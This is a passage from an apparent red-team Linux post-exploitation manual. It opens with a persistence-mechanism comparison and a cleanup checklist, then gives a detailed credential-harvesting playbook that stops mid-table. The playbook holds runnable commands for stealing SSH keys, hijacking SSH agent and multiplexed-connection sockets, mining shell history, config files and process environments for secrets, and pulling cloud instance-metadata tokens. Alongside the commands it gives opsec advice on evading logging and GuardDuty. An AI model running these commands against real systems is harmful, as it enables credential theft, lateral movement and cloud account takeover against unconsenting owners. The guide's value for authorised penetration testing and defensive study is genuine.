| NSS module | Root | Yes | Yes | Breaks on glibc update | No | Medium to high | Loaded into every process, high crash risk |
| `/etc/ld.so.preload` | Root | Yes | Yes | Breaks on glibc ABI change | No | High | Rootkit scanners check it specifically; can brick the host |
| Per-process `LD_PRELOAD` | Depends | Only with a setting mechanism | Depends | Yes | No | Low | Visible in `/proc/<pid>/environ` |
| Kernel module | Root plus `CAP_SYS_MODULE` | Only with a load mechanism | Yes | Breaks on kernel update | No | Very high | Signing, taint, and load telemetry all against you |
| `core_pattern` or `modprobe` path | Root or `CAP_SYS_ADMIN` | No, sysctl resets | Yes | Yes | No | Medium | Single-value diff; best used transiently then restored |
| Pinned eBPF program | `CAP_BPF` plus `CAP_PERFMON` | No, pins do not survive reboot | Yes | Yes | No | Medium | Enumerable via `bpftool`; superb for capture |
| Process injection | Same UID or `CAP_SYS_PTRACE` | No | Depends on target process | Yes | No | Medium to high | Inherits the target's identity and network position |
| Static pod on a Kubernetes node | Root on node | Yes | Yes | Yes | No | Low to medium | See the Kubernetes persistence subsection |

The pattern to take from the table: the quietest options are credentials, then modifications to existing mechanisms, then the mechanisms nobody baselines (generators, motd, rc.local). The loudest are the ones that create obviously anomalous objects (setuid binaries, new units, kernel modules, `ld.so.preload`). Depth of privilege and quietness are not correlated, and the deepest mechanisms are generally the loudest.

### Cleanup checklist discipline

Cleanup is not a courtesy, it is part of the deliverable, and it fails when it is reconstructed from memory at the end of the engagement. Maintain the record as you go, per host, with enough detail that someone else could reverse your changes without you.

Record, at the moment of each change:

- Hostname, IP, and the identity you used.
- Exact path of every file created, with a hash.
- Exact path of every file modified, with the **original content or a diff**, plus the original mode, owner, and full `stat` output including timestamps.
- Every account created, every group membership added, every key added and to which file.
- Every sysctl or runtime value changed, with the original value (`core_pattern` and `modprobe` in particular, since their defaults vary by distribution).
- Every service enabled, started, restarted, or reloaded, and every unit or timer created.
- Every process started that persists, with its identifying characteristics.
- Every pinned BPF object, loaded module, and injected library.
- Everything you wrote to a shared or temporary location, including `/tmp`, `/dev/shm`, `/var/tmp`, and anything under a web root.
- Every credential file you created on disk, which must be deleted rather than left.

Then remove in reverse order of installation, and verify removal rather than assuming it:

```bash
# Verification sweep after cleanup, per host
crontab -l 2>/dev/null; ls -la /etc/cron.d /etc/cron.*ly
systemctl list-unit-files --state=enabled | diff - baseline-units.txt
systemctl list-timers --all
find /etc/systemd/system -name '*.conf' -path '*.d*'
ls -la /etc/systemd/system-generators/ /etc/update-motd.d/ /etc/sudoers.d/ /etc/ssh/sshd_config.d/
cat /etc/ld.so.preload 2>/dev/null && echo "STILL PRESENT"
grep -rn 'pam_permit\|pam_exec' /etc/pam.d/
find / -xdev -perm -4000 -newermt '-30 days' -type f 2>/dev/null
getcap -r / 2>/dev/null
lsmod; bpftool prog list 2>/dev/null; ls -la /sys/fs/bpf/ 2>/dev/null
cat /proc/sys/kernel/core_pattern /proc/sys/kernel/modprobe
for f in /home/*/.bashrc /home/*/.zshenv /home/*/.ssh/rc /home/*/.ssh/authorized_keys; do echo "== $f"; tail -5 "$f" 2>/dev/null; done
ls -la /home/*/.config/systemd/user/ /home/*/.config/autostart/ 2>/dev/null
loginctl list-users
```

Two specific traps. First, a persistence mechanism you installed and forgot will still be calling back after the engagement ends, which is at best an embarrassing finding in someone else's report and at worst a genuine incident. Second, restoring a file's content is not the same as restoring its metadata: if you must restore, restore mode and ownership too, and note in the report that ctime necessarily changed, because a defender doing a post-engagement timeline will see it and should be told what it was.

## Linux credential harvesting

The premise of this section is that a Linux host is rarely valuable for itself. It is valuable for what it holds credentials to: other hosts over SSH, a cloud account through an instance role, a domain through a keytab, a database through a configuration file, a container registry, a CI system, and a source repository. A shell on a Linux box is the beginning of the credential collection phase, not the end of the access phase. The narrow subset of this material that escalates privilege on the host you are standing on is in the host enumeration and local privilege escalation part of this Linux Post-Exploitation section; what follows is the full collection sweep.

### Triage order

Collect in this order, because it is roughly descending value per second spent and it front-loads the things that expire.

1. **Volatile identity material**, because it disappears. Kerberos ticket caches, a live SSH agent socket, an active `tmux` or `screen` session, cloud CLI token caches with short lifetimes, and `/proc/<pid>/environ` of running processes.
2. **Cloud instance metadata**, because it takes ten seconds and frequently yields a role with real permissions.
3. **SSH material**: private keys, `known_hosts`, `~/.ssh/config`, and any `authorized_keys` that reveals who reaches this host.
4. **Kerberos keytabs and SSSD caches** on domain-joined hosts.
5. **Configuration and environment files** for applications running on the host, including anything under a web root and anything referenced by a systemd unit's `EnvironmentFile=`.
6. **Shell and application history**, which is cheap and often contains a password typed on a command line.
7. **`/etc/shadow`** if you are root, for offline cracking and password reuse analysis.
8. **Repositories, registries, and CI tokens**, which are the pivot into the software supply chain.
9. **Browser and desktop keyring stores**, if this is a workstation.

Do the whole sweep before you act on any of it, because acting narrows your options: the first authentication you make with a stolen credential is the first chance to be detected, and you want to have chosen the best one.

### SSH keys, configuration, and known_hosts as a network map

**What it is.** Collecting private keys, and equally importantly collecting the metadata that tells you where those keys are accepted.

**Why it works.** SSH key authentication has no server-side registration of the client, so a private key file is a complete, portable credential. The interesting part is that SSH also maintains, on the client side, a record of everywhere the user has connected. `~/.ssh/known_hosts` accumulates one entry per host, and `~/.ssh/config` records the user's intended topology including jump hosts, per-host identity files, and usernames. On an operations workstation or a bastion, `known_hosts` is often a better network map than anything you will get from scanning, and it costs no packets.

`known_hosts` may be hashed: `HashKnownHosts yes` is the default on Debian and Ubuntu, which replaces the hostname with an HMAC and a salt. Hashed entries still tell you how many hosts the user reaches, and you can test specific candidate names against the file, or crack the HMACs offline against a wordlist of hostnames and addresses.

**Preconditions.** Read access to the user's home directory, so either being that user or root.

**Commands.**

```bash
# Keys, and which are passphrase-protected
find / -xdev \( -name 'id_*' -o -name '*.pem' -o -name '*.key' -o -name 'identity' \) -type f 2>/dev/null | grep -v '\.pub$'
for k in /home/*/.ssh/id_* /root/.ssh/id_*; do
  [ -f "$k" ] || continue
  case "$k" in *.pub) continue;; esac
  printf '== %s\n' "$k"
  head -2 "$k"
  ssh-keygen -y -f "$k" >/dev/null 2>&1 && echo "  NO PASSPHRASE" || echo "  passphrase protected"
done
```

An unencrypted OpenSSH private key begins `-----BEGIN OPENSSH PRIVATE KEY-----` and contains the cipher name `none` in its header; an encrypted one names a cipher such as `aes256-ctr` and a `bcrypt` KDF. The quickest discriminator is the `ssh-keygen -y` test above, which succeeds silently without a passphrase and prompts otherwise. Older PEM-format keys announce encryption with a `Proc-Type: 4,ENCRYPTED` header.

```bash
# The map: where does this user go, as whom, and through what
cat /home/*/.ssh/config /root/.ssh/config /etc/ssh/ssh_config /etc/ssh/ssh_config.d/* 2>/dev/null
grep -hoE '^[^|#].*' /home/*/.ssh/known_hosts 2>/dev/null | awk '{print $1}' | tr ',' '\n' | sort -u
wc -l /home/*/.ssh/known_hosts 2>/dev/null      # hashed entries: count still tells you scale

# Test a candidate hostname against a hashed known_hosts
ssh-keygen -F "$TARGET" -f /home/user/.ssh/known_hosts

# Who reaches this host, and with which keys
cat /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys 2>/dev/null
```

For cracking passphrase-protected keys, `ssh2john` converts the key to a John the Ripper hash and `john` or `hashcat` takes it from there. Current OpenSSH format keys use bcrypt-based KDFs with a work factor, so they crack slowly and are only worth attacking with a targeted wordlist. Hashcat covers the OpenSSH private key formats in modes 22911, 22921, 22931, 22941 and 22951, all named `RSA/DSA/EC/OpenSSH Private Keys` and distinguished only by the cipher marker `ssh2john` writes into the hash line (`$0$`, `$6$`, `$1, $3$`, `$4$`, `$5$` in that order), so read the marker rather than guessing. Hashed `known_hosts` entries are HMAC-SHA1 constructions where the random salt is the HMAC key and the hostname is the message, which corresponds to hashcat mode 160, `HMAC-SHA1 (key = $salt)`, run against a hostname wordlist. Mode 150 is the same primitive with the roles reversed and is the wrong choice here.

**Verify it worked.** Test each key non-interactively against the hosts you found, with a batch mode that fails instead of prompting:

```bash
ssh -i "$KEY" -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no \
    -o ConnectTimeout=5 "$USER@$TARGET" id
```

**Detection and opsec.** Reading key files produces no log entry by itself unless auditd watches those paths, which is uncommon. **Using** a key does: every attempt is logged by the target's sshd with the source address, the username, and, on success, the key fingerprint. Spraying one key across every host in `known_hosts` produces a burst of authentication events from one source, which is one of the more reliably detected lateral movement patterns because it is trivially visible in aggregated auth logs. Move deliberately, one host at a time, from a source address that makes sense for the key's owner where you can.

**Failure modes.**

- Key works nowhere: it is a key for a service that is not SSH (a signing key, a TLS key, a git deploy key). Check the comment field and surrounding files.
- Key rejected everywhere despite being valid: the corresponding `authorized_keys` entry has a `from=` restriction, or the account is restricted by `AllowUsers`, or the key has expired via a certificate.
- The "key" is actually an SSH **certificate** setup: look for `id_*-cert.pub` and a `CertificateFile` directive. A certificate has a validity window and is useless once expired, and the CA is the real target.
- `known_hosts` is empty on a host you expected to be a jump box: `StrictHostKeyChecking no` with `UserKnownHostsFile /dev/null` in the config, which is itself a finding and tells you automation runs from here.

### Agent sockets, forwarded agents, and multiplexed sessions

**What it is.** Using a live SSH agent, or a live multiplexed SSH connection, to authenticate onward without ever possessing a private key.

**Why it works.** `ssh-agent` holds decrypted private keys in its own memory and exposes a Unix domain socket, whose path is in `SSH_AUTH_SOCK`. Clients ask the agent to perform signing operations; the key never leaves the agent. That means possession of the socket is functionally possession of the key **for as long as the agent lives**, and it also means you cannot exfiltrate the key itself, only use it. The socket's filesystem permissions restrict it to its owner, so as root you can use any user's agent, and as a user you can use your own.

The critical case is **agent forwarding**. When a user connects with `ForwardAgent yes` (or `ssh -A`), sshd on the target creates a socket that proxies back to the agent on the user's workstation. Anyone who can read that socket on the intermediate host, which includes root and includes any process running as that user, can sign with the workstation's keys. On a shared bastion this is a complete compromise of every user who connects with forwarding enabled, and it is why forwarding is discouraged in favour of `ProxyJump`.

Separately, **connection multiplexing** is an even better prize when present. With `ControlMaster` and a `ControlPath` socket, an already-authenticated SSH connection is exposed as a socket in the user's directory. Attaching to it gives you a session on the remote host with **no credential at all**, no key, no agent, and no new authentication event on the target beyond a new channel on an existing connection.

**Preconditions.** A live socket. Agents die with the session, so this is a race against the user logging out. Root, or the socket's owner.

**Commands.**

```bash
# Find live agent sockets and multiplex sockets
ls -la /tmp/ssh-*/agent.* 2>/dev/null
find /tmp /run/user -maxdepth 3 -type s -name 'agent.*' 2>/dev/null
ls -la /home/*/.ssh/*.sock /home/*/.ssh/master-* /home/*/.ssh/control-* 2>/dev/null

# Correlate sockets to processes and owners
ps -eo pid,user,comm | grep -E 'ssh-agent|gpg-agent'
for p in $(pgrep -f 'sshd:.*@'); do tr '\0' '\n' < /proc/$p/environ 2>/dev/null | grep -E 'SSH_AUTH_SOCK|SSH_CONNECTION'; done
```

```bash
# Hijack an agent: list what it holds, then use it
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXXXX/agent.1234
ssh-add -l          # fingerprints and key types held
ssh-add -L          # full public keys, which you can match against authorized_keys elsewhere
ssh -o IdentitiesOnly=no "$USER@$TARGET" id
```

```bash
# Ride an existing multiplexed connection: no credential required
ssh -S /home/user/.ssh/master-user@target:22 -O check "$TARGET"
ssh -S /home/user/.ssh/master-user@target:22 "$TARGET" id
```

```bash
# Live terminal multiplexer sessions belonging to a user you now control
tmux ls 2>/dev/null; ls -la /tmp/tmux-*/ 2>/dev/null
tmux -S /tmp/tmux-1000/default attach -t 0
screen -ls; screen -x
```

An attached `tmux` or `screen` session is often the single highest-value artefact on a bastion, because it comes with the user's environment: a valid `kubectl` context, an unexpired cloud session, a live agent, and frequently a `sudo` timestamp that has not yet expired.

**Verify it worked.** `ssh-add -l` returning key fingerprints proves the agent is usable. `-O check` on a control socket returning the master's PID proves the multiplexed connection is alive. Then authenticate to one host and stop.

**Detection and opsec.** Using a hijacked agent produces authentication events on the **destination** host with the legitimate user's key fingerprint and the intermediate host's source address, which is exactly what legitimate agent forwarding looks like. That is unusually good camouflage. The tell is timing and target selection: the user's key authenticating to hosts they never touch, at times they are not working. Riding a control socket is quieter still, because the destination sees a new channel on an existing authenticated connection rather than a new authentication.

Two constraints to check. `ssh-add -c` marks a key as requiring confirmation, which pops an askpass dialogue in the user's session on every use, immediately alerting them. `ssh-add -t` sets a lifetime after which the key is dropped. Both are visible in `ssh-add -l` output for confirmation-required keys.

**Failure modes.**

- `Could not open a connection to your authentication agent`: stale socket, agent has exited. There is nothing to recover.
- `ssh-add -l` says "The agent has no identities": the agent exists but holds nothing, which happens with forwarded agents whose upstream has already dropped keys.
- A confirmation dialogue appears on the user's desktop: the key was added with `-c`. You have just notified them.
- Control socket `-O check` fails with "Control socket connect: Connection refused": the master exited and left a stale socket file.
- `tmux attach` fails with a protocol version error: your `tmux` binary differs from the one that created the server. Use the same binary path the server process is running.

### Shell and application history

**What it is.** Reading the accumulated command history of every user, across the many files that hold it, for credentials typed on command lines and for a description of what this host does.

**Why it works.** Interactive tools persist history to make life convenient, and users pass secrets as arguments. `mysql -p<password>`, `curl -u user:pass`, `export AWS_SECRET_ACCESS_KEY=...`, `openssl` with a `-passin pass:` argument, and `kubectl create secret` with literal values all end up on disk in plaintext. History also tells you the host's role, the names of internal systems, and the exact commands that work in this environment, which is worth as much as the credentials.

The files are more numerous than people remember:

| File | Source |
| --- | --- |
| `~/.bash_history` | bash |
| `~/.zsh_history` | zsh, with `: <timestamp>:<elapsed>;command` format when `EXTENDED_HISTORY` is set |
| `~/.sh_history`, `~/.history` | ksh, and some other shells |
| `~/.local/share/fish/fish_history` | fish, YAML-like format with timestamps |
| `~/.python_history` | Python REPL |
| `~/.node_repl_history` | Node REPL |
| `~/.mysql_history` | MySQL and MariaDB clients |
| `~/.psql_history` | PostgreSQL client |
| `~/.rediscli_history` | redis-cli, including `AUTH` commands |
| `~/.sqlite_history` | sqlite3 |
| `~/.mongorc.js`, `~/.dbshell` | MongoDB shell history and startup |
| `~/.lesshst` | `less` search strings, which sometimes contain what someone was hunting for in a config file |
| `~/.viminfo`, `~/.local/state/nvim/shada` | Vim and Neovim: recently edited files, search history, and register contents, which can literally contain a yanked password |
| `~/.wget-hsts`, `~/.local/share/recently-used.xbel` | Host and file access maps rather than credentials |
| `/root/.*history` | The same set for root, usually the richest |

**Preconditions.** Read access, so the user or root.

**Commands.**

```bash
# Sweep every history-shaped file on the host
find / -xdev -type f \( -name '.*history*' -o -name '*_history' -o -name 'fish_history' -o -name '.viminfo' \) 2>/dev/null

# Grep the interesting ones for credential-shaped content
grep -riE '(pass(w(or)?d)?|secret|token|api[_-]?key|-p[^ ]|--password|BEGIN [A-Z ]*PRIVATE KEY)' \
  /home/*/.*history* /root/.*history* /home/*/.local/share/fish/fish_history 2>/dev/null | head -60

# zsh extended history includes timestamps, which tells you when the credential was current
head -5 /home/*/.zsh_history 2>/dev/null

# Vim registers and recent files
grep -A3 -E '^\*|^"' /home/*/.viminfo 2>/dev/null | head -40
```

Check the history settings too, because they tell you what you are **not** seeing: `HISTCONTROL=ignorespace` (or `ignoreboth`) means any command the user prefixed with a space was never recorded, `HISTIGNORE` may exclude patterns, `HISTFILE` may be redirected or set to `/dev/null`, and `HISTSIZE=0` disables it. A host where root's history is empty and `HISTFILE` is unset is a host with a careful administrator, which is information in itself.

```bash
grep -hE 'HIST(FILE|SIZE|CONTROL|IGNORE|FILESIZE)|unset HISTFILE|set \+o history' \
  /home/*/.bashrc /home/*/.bash_profile /root/.bashrc /etc/profile /etc/profile.d/* 2>/dev/null
```

**Verify it worked.** Test any credential you find, but note that history is a record of the past: passwords found there may be rotated. Treat them primarily as input to a password-pattern analysis for spraying rather than as guaranteed working credentials.

**Detection and opsec.** Reading history files generates nothing unless auditd watches them. The classic mistake is the opposite direction: **your own** commands are being written to history as you work, which is how operators leave a full transcript of the engagement on the target. Set `unset HISTFILE` and `export HISTSIZE=0` at the start of an interactive session, or prefix commands with a space where `HISTCONTROL` supports it, and be aware that neither helps if the shell is instrumented by auditd's `execve` rules, by `sudo` I/O logging, or by an EDR that captures command lines. Do not truncate or delete an existing history file: the file's disappearance or shrinkage is far more suspicious than your commands in it, and it destroys evidence the client may need.

**Failure modes.**

- History file exists but is empty or stale: the shell writes history on clean exit, so a session still open has its history in memory only. `HISTFILE` for a live session can sometimes be recovered from the shell process's memory.
- `~/.bash_history` is a symlink to `/dev/null`: deliberate, and a signal about the user.
- fish history is in a structured format that greps poorly line by line; parse it as records.

### Configuration files, environment files, and where application secrets live

**What it is.** The systematic sweep of on-disk application configuration for credentials, which on most servers is where the actual crown jewels are.

**Why it works.** Applications need credentials at runtime and, absent a secrets manager, they read them from a file. Those files are readable by the service account, and often by more than that, because permissions get relaxed during troubleshooting and never tightened. Systemd's `EnvironmentFile=` pattern in particular concentrates secrets into predictable locations under `/etc/default` and `/etc/sysconfig`.

The recurring locations, grouped so you can sweep them systematically:

| Category | Paths |
| --- | --- |
| Generic per-user credential stores | `~/.netrc`, `~/.authinfo`, `~/.pgpass`, `~/.my.cnf`, `~/.git-credentials`, `~/.subversion/auth/`, `~/.config/rclone/rclone.conf` |
| Language and package registries | `~/.npmrc` and project `.npmrc` (`_authToken`), `~/.pypirc`, `~/.gem/credentials`, `~/.cargo/credentials.toml`, `~/.m2/settings.xml`, `~/.gradle/gradle.properties`, `~/.composer/auth.json`, `~/.docker/config.json`, `~/.nuget/NuGet/NuGet.Config` |
| Web application config | `wp-config.php`, Laravel `.env`, Django `settings.py` and `local_settings.py`, Rails `config/database.yml` and `config/master.key`, Spring `application.properties` and `application.yml`, .NET `appsettings.json` and `web.config`, `.env` anywhere |
| Directory and identity integration | `/etc/sssd/sssd.conf` (`ldap_default_authtok`), `/etc/nslcd.conf`, `/etc/ldap.conf`, `/etc/openldap/ldap.conf`, `/etc/pam_ldap.conf`, `/etc/krb5.conf` and keytabs |
| Filesystem mounts | `/etc/fstab` (CIFS `credentials=` pointing at a file, and NFS exports), `/etc/samba/smb.conf`, `/etc/auto.*` autofs maps, `/etc/exports` |
| Service unit environment | systemd `Environment=` and `EnvironmentFile=` directives, `/etc/default/*`, `/etc/sysconfig/*` |
| Infrastructure as code | `terraform.tfstate` and `*.tfvars` (state files contain resolved secrets in plaintext), Ansible `group_vars`/`host_vars`, `.vault_pass`, `vault-password-file`, Chef `client.rb` and validation keys, Puppet `hiera.yaml` and eyaml keys |
| Monitoring and agents | Zabbix, Nagios, Telegraf, Datadog, Splunk forwarder, and Filebeat configs, which frequently hold API keys and sometimes domain service account passwords |
| Backup software | Bacula, Veeam agent, Restic and Borg repository passwords, `rsnapshot` and `duplicity` config |

**Preconditions.** Read access, which is where privilege matters: many of these are mode `0600` and owned by the service account, so a shell as `www-data` gets the web app secrets and root gets everything.

**Commands.**

```bash
# Start from what is running, and work back to its configuration
systemctl list-units --type=service --state=running --no-legend | awk '{print $1}'
systemctl cat $(systemctl list-units --type=service --state=running --no-legend | awk '{print $1}') 2>/dev/null \
  | grep -E 'Environment|EnvironmentFile|ExecStart|User=' | sort -u
cat /etc/default/* /etc/sysconfig/* 2>/dev/null | grep -iE 'pass|secret|token|key' | head -40
```

```bash
# Targeted sweep of the well-known per-user files
for f in .netrc .pgpass .my.cnf .git-credentials .npmrc .pypirc .authinfo; do
  ls -la /home/*/"$f" /root/"$f" 2>/dev/null
done
cat /home/*/.netrc /root/.netrc /home/*/.pgpass /root/.pgpass 2>/dev/null
```

```bash
# Broad content sweep, scoped to keep it fast and quiet.
# Scope by directory, cap depth, and exclude noisy trees rather than grepping /.
grep -rIlEs --exclude-dir={proc,sys,dev,run,snap,node_modules,.git,site-packages,vendor} \
  -e 'BEGIN (RSA|OPENSSH|EC|DSA|PGP) PRIVATE KEY' \
  -e '(password|passwd|secret|api[_-]?key|access[_-]?token|client[_-]?secret)[[:space:]]*[:=]' \
  /etc /opt /srv /var/www /home /root 2>/dev/null | head -60
```

```bash
# .env and config files anywhere under application roots
find /var/www /srv /opt /home -maxdepth 6 -type f \
  \( -name '.env*' -o -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.yml' -o -name '*.yaml' -o -name '*.json' -o -name '*.properties' \) \
  -size -512k 2>/dev/null | head -100
```

```bash
# World-readable secrets: the fastest win, and a report finding in its own right
find /etc -type f -perm -o+r -name '*.conf' 2>/dev/null | xargs grep -lIsE 'password|secret|token' 2>/dev/null | head
```

**Verify it worked.** Credentials found in configuration are usually live, because the service is using them right now. Verify against the service directly, which is also less conspicuous than verifying against a central identity provider.

**Detection and opsec.** A recursive `grep` over `/` is slow, spikes disk and CPU, and on a monitored host the process itself is a detection: a long-running `grep -r /` by a service account is anomalous behaviour that some EDRs flag as discovery. Scope your searches, exclude `/proc`, `/sys`, and package trees, cap file size, and prefer many targeted greps to one enormous one. Reading files leaves atime updates unless the filesystem is mounted `noatime` or `relatime` (the latter is the default and only updates atime under specific conditions), which is a minor forensic artefact but a real one on a `strictatime` mount.

**Failure modes.**

- Permission denied on everything interesting: you have the wrong identity. Look for a service account whose files you can reach, and pivot to it.
- `.env` file present but the secrets are references (`${SECRET_FROM_VAULT}`): the host uses a secrets manager, and the real target is the identity the host uses to authenticate to it, which is usually an instance role or a Kubernetes service account. Follow that thread.
- Config points to a credential file you cannot read: note the path and revisit after escalating.
- Secrets are encrypted at rest (Ansible Vault, `git-crypt`, `sops`): the ciphertext is worthless without the key, so find the key. Ansible Vault files are crackable offline if the passphrase is weak, in hashcat mode 16900 (`Ansible Vault`).

### Process environment and command lines

**What it is.** Reading the environment and arguments of running processes, which is where secrets live on hosts that pass them in at launch rather than storing them.

**Why it works.** `/proc/<pid>/environ` is the process's initial environment, and `/proc/<pid>/cmdline` is its arguments, both readable by the process owner and by root. The twelve-factor pattern of injecting configuration as environment variables, which is near-universal in containers and increasingly common outside them, means database URLs with embedded passwords, API keys, and cloud credentials are sitting in `environ` for the lifetime of the process. Command lines are worse, because they are visible to **every** user on the host through `ps`, not just the owner.

**Preconditions.** Same UID as the target process, or root. Note `hidepid` mount options on `/proc` (`hidepid=2` hides other users' processes entirely) and that inside containers you only see your own namespace's processes unless `hostPID` is shared.

**Commands.**

```bash
# Every readable environment, filtered for credential shapes
for p in /proc/[0-9]*; do
  tr '\0' '\n' < "$p/environ" 2>/dev/null \
    | grep -aiE '(pass|secret|token|key|cred|_url=.*:.*@)' \
    | sed "s|^|${p#/proc/}: |"
done | sort -u | head -60
```

```bash
# Command lines, including secrets passed as arguments
ps auxwwe 2>/dev/null | grep -iE 'pass|secret|token|-p[^ ]|--password' | grep -v grep
ps -eo pid,user,args --sort=start_time | tail -40
mount | grep hidepid
```

**Verify it worked.** These credentials are live by definition, since a process is currently using them.

**Detection and opsec.** Reading `/proc` is unremarkable and generates no log. Iterating every PID is a short burst of activity that some behavioural detections notice as discovery, but it is far quieter than a filesystem-wide grep and it is higher yield on modern application servers. This should be one of the first things you run.

**Failure modes.**

- Everything is empty: `hidepid` on `/proc`, or you are not the owner and not root, or the processes genuinely take configuration from files.
- Variables present but truncated: `environ` is the environment **at exec time**, so anything the process set or changed later is not there, and anything it unset is still there.

### Cloud instance metadata

**What it is.** Querying the link-local metadata service to obtain the credentials the cloud provider vends to the instance, and the instance's own description of its role in the environment.

**Why it works.** Every major cloud runs a metadata service on the link-local address `169.254.169.254`, reachable from the instance without authentication, which returns instance configuration and, critically, short-lived credentials for the identity attached to the instance (an IAM instance profile, a GCP service account, or an Azure managed identity). The design assumption is that anything running on the instance is entitled to the instance's identity. That makes a shell on the instance equivalent to that identity, and it makes a **server-side request forgery** in an application on the instance equivalent to the same thing without a shell, which is why IMDS is the canonical SSRF target.

The three providers differ in ways that matter operationally:

| Provider | Endpoint and requirement | Credentials path |
| --- | --- | --- |
| AWS IMDSv1 | Plain `GET` to `169.254.169.254`, no header | `/latest/meta-data/iam/security-credentials/<role>` |
| AWS IMDSv2 | `PUT` to `/latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds`, then `GET` with `X-aws-ec2-metadata-token` | Same path. Response hop limit defaults to 1, which breaks naive SSRF proxying and container bridge networking |
| GCP | `GET` with header `Metadata-Flavor: Google`, host `metadata.google.internal` | `/computeMetadata/v1/instance/service-accounts/default/token`, plus `/identity?audience=` for an ID token |
| Azure | `GET` with header `Metadata: true` | `/metadata/identity/oauth2/token?api-version=...&resource=https://management.azure.com/` |
| AWS ECS task role | `169.254.170.2` plus the relative URI from `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` | Returns task role credentials |
| AWS EKS IRSA | No IMDS call. A projected OIDC token file at `AWS_WEB_IDENTITY_TOKEN_FILE` exchanged via `sts:AssumeRoleWithWebIdentity` | Role from `AWS_ROLE_ARN` |
| AWS EKS Pod Identity | A node-local agent at `169.254.170.23` (or `[fd00:ec2::23]` on IPv6), with a projected service account token on disk | `AWS_CONTAINER_CREDENTIALS_FULL_URI` is set to `http://169.254.170.23/v1/credentials` and `AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE` to `/var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token`. Read the environment rather than hardcoding either |

The IMDSv2 hop limit is the single most useful detail here. Setting the response hop limit to 1 means a packet from the metadata service cannot traverse a router, so a container on a Docker bridge network cannot reach it, and neither can an SSRF that is proxied through anything. Where a cluster needs pods to reach IMDS, the hop limit is raised, which is a configuration you should check for because it re-enables the pod-to-node-role escalation path.

Beyond credentials, the metadata service returns things that are valuable on their own: user data and startup scripts (which very often contain bootstrap credentials in plaintext), network configuration, tags, and the project or account identifiers you need to make sense of what you have. On GCP, project-level metadata includes `ssh-keys` and `startup-script`, and write access to those through the API is itself a persistence and escalation primitive.

**Preconditions.** Network reachability to the link-local address from wherever you are executing, plus the right headers. `curl` or any HTTP client, or a raw socket if neither is installed.

**Commands.**

```bash
# Which cloud, cheaply
curl -s --connect-timeout 2 -o /dev/null -w '%{http_code}\n' http://169.254.169.254/
cat /sys/class/dmi/id/product_uuid /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/chassis_asset_tag 2>/dev/null
```

```bash
# AWS, IMDSv2 with an IMDSv1 fallback
TOK=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
      -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
H=(-H "X-aws-ec2-metadata-token: $TOK")
curl -s "${H[@]}" http://169.254.169.254/latest/meta-data/
ROLE=$(curl -s "${H[@]}" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s "${H[@]}" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
curl -s "${H[@]}" http://169.254.169.254/latest/user-data
curl -s "${H[@]}" http://169.254.169.254/latest/dynamic/instance-identity/document
```

```bash
# GCP
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes'
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text' | head -60
```

```bash
# Azure
curl -s -H 'Metadata: true' \
  'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | head -40
curl -s -H 'Metadata: true' \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'
```

```bash
# Container-specific credential sources
env | grep -E 'AWS_|AZURE_|GOOGLE_|GCP_|KUBERNETES_'
[ -n "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ] && \
  curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
[ -n "$AWS_WEB_IDENTITY_TOKEN_FILE" ] && cat "$AWS_WEB_IDENTITY_TOKEN_FILE"
```

**Verify it worked.** Use the credentials for a single identity call rather than an enumeration sweep: `aws sts get-caller-identity`, `gcloud auth list` with the token, or a token introspection against the Azure endpoint. That one call tells you who you are and costs one log entry.

**Detection and opsec.** Metadata requests themselves are not logged by the provider in a way defenders normally see, but everything you do **with** the credentials is: CloudTrail, GCP Cloud Audit Logs, and Azure Activity Log record the calls, including the source IP. AWS specifically annotates credentials obtained from an instance profile, and GuardDuty has a finding type for instance credentials being used from outside the instance (`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`), which fires the moment you use them from your own machine rather than from the instance. That is the key opsec point: **use instance credentials from the instance**, or proxy through it, rather than exfiltrating them, unless you accept a high-confidence alert. Enumeration bursts (a thousand `Describe*` and `List*` calls in a minute) are also a well-detected pattern.

**Failure modes.**

- Connection times out: IMDS disabled on the instance (`HttpEndpoint disabled`), or blocked by a local firewall rule, or you are in a container whose network cannot reach the hop-limited address.
- `401` or `403` on AWS with a plain `GET`: IMDSv2 is enforced (`HttpTokens required`) and you need the token `PUT` first.
- Token `PUT` fails from an SSRF: the vulnerable application only performs `GET` requests, which is exactly the protection IMDSv2 is designed for. Look for an SSRF primitive that permits method control or headers.
- Role exists but credentials return nothing: no instance profile attached. The metadata is still valuable (user data, tags, network).
- Credentials work for one call then fail: they are short-lived and must be refreshed from IMDS. Re-request rather than caching.
- GCP token has narrow scopes: the legacy instance scopes model restricts what the service account can do from this instance regardless of its IAM roles. Check `/scopes`.

### Cloud CLI credential caches

**What it is.** Harvesting the credentials and cached tokens that cloud command line tools leave on disk, which are frequently long-lived and belong to a **human** with far more privilege than any instance role.

**Why it works.** CLIs cache credentials so users do not reauthenticate constantly. Those caches are files in the user's home directory, protected only by filesystem permissions. Long-lived AWS access keys in `~/.aws/credentials` do not expire at all. SSO and OIDC caches contain refresh tokens that can be exchanged for new access tokens well beyond the access token's lifetime. On a shared jump host or a developer workstation, these are the best credentials on the box.

| Tool | Paths | Content |
| --- | --- | --- |
